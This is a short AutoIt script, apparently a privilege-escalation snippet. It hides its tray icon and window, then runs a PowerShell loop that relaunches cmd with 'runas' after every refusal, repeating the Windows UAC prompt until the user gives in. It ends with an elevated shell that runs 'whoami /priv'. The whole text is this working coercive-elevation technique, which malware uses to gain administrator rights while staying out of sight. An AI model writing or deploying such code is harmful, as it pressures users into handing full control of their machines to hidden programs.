#NoTrayIcon
RunWait(@ComSpec & " /c powershell while($true){try{Start-Process 'cmd' -Verb runas -ArgumentList '/k whoami /priv';exit}catch{}}", @SystemDir, @SW_HIDE)
